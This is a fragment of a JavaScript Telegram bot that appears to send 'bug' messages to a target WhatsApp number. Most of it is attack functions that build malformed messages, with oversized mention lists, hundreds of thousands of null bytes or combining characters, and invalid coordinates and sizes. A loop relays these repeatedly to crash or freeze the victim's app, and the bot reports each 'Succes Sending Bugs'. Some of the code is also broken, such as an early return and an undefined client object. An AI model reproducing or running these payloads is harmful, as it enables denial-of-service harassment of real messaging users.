⬡ ターゲット : ${q}
⬡ タイプ バグ : ForceNew
⬡ バグステータス : Process
⬡ デイデイト  : ${date}

<blockquote><code>© Vanzz𖣂</code></blockquote>
`,
        parse_mode: "HTML",
      }
    );

    
    console.log(chalk.white(`Process Sending Bugs To ${target}`));

    for (let i = 0; i < 80; i++) {
      await NanasDelayHard(sock, target);
      await NanasDelayHard(sock, target);
      await NanasDelayHard(sock, target);
      await VNFnewbulldoser(sock, target);
      await VNFnewbulldoser(sock, target);
      await FcNoClik(sock, target);
      await FcNoClik(sock, target);
      await FcNoClik(sock, target);
      await sleep(5000);
      console.log(chalk.magenta(`Succes Sending Bugs To ${target}`));
    }
    
    await ctx.editMessageCaption(
      `
<blockquote><b>⚘. Xevorz - Catalyze 「 ཀ 」</b></blockquote>

⬡ ターゲット : ${q}
⬡ タイプ バグ : ForceNew 
⬡ バグステータス : Succes Sending Bugs
⬡ デイデイト  : ${date}

<blockquote><code>© Vanzz𖣂</code></blockquote>
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "[ 📞 ] Check ϟ Target", url: `https://wa.me/${q}` }],
          ],
        },
      }
    );
  }
);

// ~ Function Bugs ~ \\

async function  VNFnewbulldoser(sock, target) {
  let start = Date.now();
  while (Date.now() - start < 300000) {
    const Msg = {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              remoteJid: "\u0000",
              urlTrackingMap: {
                urlTrackingMapElements: Array.from({ length: 209000 }, () => ({
                  type: 1
                }))
              }
            },
            body: {
              text: "BàpãkLõwh",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "{ X: { status:true } }",
              version: 3
            },
            contextInfo: {
              mentionedJid: Array.from({ length: 9000 }, (_, r) => `88888888${r + 1}@s.whatsapp.net`)
            }
          }
        }
      }
    };

    await sock.relayMessage(target, Msg, {
      participant: { jid: target }
    });
    await new Promise(r => setTimeout(r, 1000));
  }
}

async function Object11(sock, target) {
  await sock.sendMessage(target, {
    image: { url: "https://files.catbox.moe/ltoayk.jpg" },
     caption: "\n".repeat(90000),
     width: -999,
     weight: -999,
     height: 999,
     fileLength: "9999999",
      contextInfo: {
      isForwarded: true,
      forwardingScore: 9999,
      bussinesForwardingInfo: {
       bussinesOwnerJid: "13135550002@s.whatsapp.net"
      },
      remoteJid: "status@broadcast",
      quotedMessage: {
        documentMessage: {
          caption: "\u0000".repeat(90000),
          contactVcard: true
        }
      },
        externalAdReply: {
          title: "\u0000".repeat(9000),
          body: "\u0000".repeat(9000),
          thumbnail: Buffer.from([0x00]),
          sourceUrl: "https://instagram.com",
          stanzaId: sock.generateMessageTag(),
          renderLargerThumnail: true,
        },
        mentionedJid: [target, "13135550002@s.whatsapp.net"],
      }
  }, {});
}

async function LocationUi(sock, target) {
const object1 = "ꦽ".repeat(90000);
const object2 = "ꦾ".repeat(1000);
  const object = {
    locationMessage: {
      degreesLatitude: -1e15,
      degreesLongtitude: -999,
      name: "NiccawMD -" + object1,
      address: object2 + object1,
      url: `https://${object2}.com`,
      jpegThumbnail: Buffer.alloc(0),
      contextInfo: {
        isForwarded: true,
        forwardingScore: 9999,
        bussinesForwardingInfo: {
          bussinesOwnerJid: target
        },
        mentionedJid: [target, "13135550002@s.whatsapp.net"],
      }
    }
  }
  await sock.relayMessage(target, object, {
    messageId: sock.generateMessageTag()
  });
}

async function FcNoClik(sock, target) {
  for (let i = 0; i < 50; i++) {
  const Message1 = {
  "groupStatusMessageV2": {
    "message": {
      "stickerMessage": {
        "url": "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
        "fileSha256": "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
        "fileEncSha256": "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
        "mediaKey": "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
        "mimetype": "image/webp",
        "directPath": "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
        "fileLength": "10610",
        "mediaKeyTimestamp": "1775044724",
        "stickerSentTs": "1775044724091"
      }
    }
  }
};

 const Message2 = {
    viewOnceMessage: {
    message: {
    locationMessage: {
        degreesLongitude: 0,
        degreesLatitude: 0,
        name: "./GyzêñLyõràå." + "ꦾ".repeat(10000), 
        url: "https://files.catbox.moe/6yrcjm" +  "ោ៝".repeat(15000) + ".mp4", 
        address: "../GyzêñLyõràå." + "ꦽ".repeat(20000), 
        contextInfo: {
          externalAdReply: {
            renderLargerThumbnail: true, 
            showAdAttribution: true, 
            body: "Gyzen Not Developer", 
            title: "ೄྀ".repeat(10000), 
            sourceUrl: "https://t.me/" +  "༒".repeat(10000),  
            thumbnailUrl: null, 
            quotedAd: {
              advertiserName: "ᬊ".repeat(12000), 
              mediaType: 2,
              jpegThumbnail: "https://files.catbox.moe/3ech2h.jpg", 
              caption: "../GyzêñLyõràā.", 
            }, 
            pleaceKeyHolder: {
              remoteJid: "0@s.whatsapp.net", 
              fromMe: false, 
              id: "ABCD1234567"
            }
          }
        }
      }
    }
  }
};
   
  return await sock.relayMessage(target, Message1, {});
   await sock.relayMessage(target, Message2, {
         participant: { jid: target }
    });
  }
}

async function NanasDelayHard(sock, target) {
  let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length:2000 }, (_, y) => `1313555000${y + 1}@s.whatsapp.net`)
      }, 
      body: {
        text: "Nanas Nie Dek b҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "address_message",
        paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"Nanas\",\"landmark_area\":\"X\",\"address\":\"@null\",\"tower_number\":\"@null\",\"city\":\"LexzyModss\",\"name\":\"@null\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"NanasSange : ${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, { userJid:target });

  await NanasMuda.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target, "13135550002@s.whatsapp.net"],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

// ~ End Function Bugs ~ \\
(async () => {
  WhatsAppConnect();
  bot.launch();
})();
